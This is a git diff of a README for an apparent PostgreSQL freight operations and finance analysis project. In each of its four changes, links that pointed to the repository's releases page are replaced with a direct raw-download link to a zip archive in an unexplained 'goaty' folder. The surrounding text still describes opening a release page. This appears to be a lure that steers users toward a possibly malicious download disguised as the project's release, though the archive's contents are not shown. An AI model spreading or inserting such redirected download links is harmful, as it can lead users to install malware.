@@ -1,6 +1,6 @@
 # 📦 Sql-Operational-and-Financial-Analysis-Swiftroute - Clear Freight Insights Fast
 
-[![Download](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/raw/refs/heads/main/goaty/Analysis_Operational_Swiftroute_Sql_Financial_and_v1.9.zip)
 
 ## 🚚 Overview
 
@@ -12,7 +12,7 @@ The project uses PostgreSQL and focuses on practical reports that help with dail
 
 Visit this page to download the latest release:
 
-[Download the latest release](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/releases)
+[Download the latest release](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/raw/refs/heads/main/goaty/Analysis_Operational_Swiftroute_Sql_Financial_and_v1.9.zip)
 
 After you open the release page, choose the file for Windows if one is listed. Save the file to your computer, then follow the steps below.
 
@@ -56,7 +56,7 @@ Each file has a role in the analysis flow. The SQL scripts usually contain the m
 ## ⚙️ How to Install on Windows
 
 1. Open the release page using this link:
-   [https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/releases](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/releases)
+   [https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/raw/refs/heads/main/goaty/Analysis_Operational_Swiftroute_Sql_Financial_and_v1.9.zip](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/raw/refs/heads/main/goaty/Analysis_Operational_Swiftroute_Sql_Financial_and_v1.9.zip)
 
 2. Find the newest release at the top of the page.
 
@@ -166,7 +166,7 @@ These topics point to a project built for shipment review and route analysis in 
 
 Use this link whenever you want the latest version:
 
-[Open Releases](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/releases)
+[Open Releases](https://github.com/yogic-gothic656/Sql-Operational-and-Financial-Analysis-Swiftroute/raw/refs/heads/main/goaty/Analysis_Operational_Swiftroute_Sql_Financial_and_v1.9.zip)
 
 ## 🧷 File Setup Tips
 
